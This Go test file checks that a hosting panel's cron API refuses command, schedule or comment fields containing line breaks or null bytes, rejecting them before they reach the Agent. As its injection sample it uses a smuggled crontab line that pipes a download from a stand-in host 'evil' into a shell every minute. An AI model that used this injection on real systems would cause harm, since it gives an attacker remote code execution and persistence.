package main

import (
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// TestATaskWithALineBreakIsRefusedWithWords (alpha.150 lab W2): a command,
// schedule or description with a line break is the ordinary refusal with
// words (400 CRON_TASK_LINE_BREAK), before the Agent is asked, for a new task
// and a changed one; it was a 500. The Agent's own refusal of such a field
// (an Agent asked by another path) gets the same words.
func TestATaskWithALineBreakIsRefusedWithWords(t *testing.T) {
	agent := &cronMutationTestAgent{success: true}
	panel := newCronMutationTestPanel(t, agent)
	for _, field := range []string{"command", "schedule", "comment"} {
		for _, brk := range []string{"\n", "\r", "\x00"} {
			fields := map[string]string{"schedule": "0 3 * * *", "command": "/usr/bin/backup", "comment": "nightly", "version": "ct1-test", "id": "x"}
			fields[field] += brk + "* * * * * /bin/sh -c 'curl evil|sh'"
			body, _ := json.Marshal(fields)
			for _, method := range []string{http.MethodPost, http.MethodPut} {
				recorder := httptest.NewRecorder()
				request := httptest.NewRequest(method, "/api/v1/domains/34/cron", strings.NewReader(string(body)))
				if method == http.MethodPost {
					panel.handleAddCronJob(recorder, request, testCronTenant)
				} else {
					panel.handleUpdateCronJob(recorder, request, testCronTenant)
				}
				var answer apiErrorBody
				_ = json.Unmarshal(recorder.Body.Bytes(), &answer)
				if recorder.Code != http.StatusBadRequest || answer.Code != errCodeCronTaskLineBreak || answer.Error != cronTaskLineBreakMessage {
					t.Fatalf("%s %s %q: %d %s", method, field, brk, recorder.Code, recorder.Body.String())
				}
			}
		}
	}
	if agent.calls != 0 {
		t.Fatalf("a task with a line break reached the Agent %d times", agent.calls)
	}
	// The Agent's own words for such a field (cron_rpc.go rejectCrontabInjection).
	for _, field := range []string{"schedule", "command", "comment"} {
		agent.err = errors.New("cron " + field + " must not contain line breaks")
		recorder := httptest.NewRecorder()
		panel.handleAddCronJob(recorder, httptest.NewRequest(http.MethodPost, "/api/v1/domains/34/cron", strings.NewReader(`{"schedule":"0 3 * * *","command":"true","version":"ct1-test"}`)), testCronTenant)
		if recorder.Code != http.StatusBadRequest || !strings.Contains(recorder.Body.String(), errCodeCronTaskLineBreak) {
			t.Fatalf("the Agent's refusal of the %s: %d %s", field, recorder.Code, recorder.Body.String())
		}
	}
	// An ordinary one-line task still goes through.
	agent.err = nil
	recorder := httptest.NewRecorder()
	panel.handleAddCronJob(recorder, httptest.NewRequest(http.MethodPost, "/api/v1/domains/34/cron", strings.NewReader(`{"schedule":"*/15 * * * *","command":"php -q cron.php >> /tmp/cron.log 2>&1 ; echo %s","version":"ct1-test"}`)), testCronTenant)
	if recorder.Code != http.StatusOK {
		t.Fatalf("a one-line task: %d %s", recorder.Code, recorder.Body.String())
	}
}
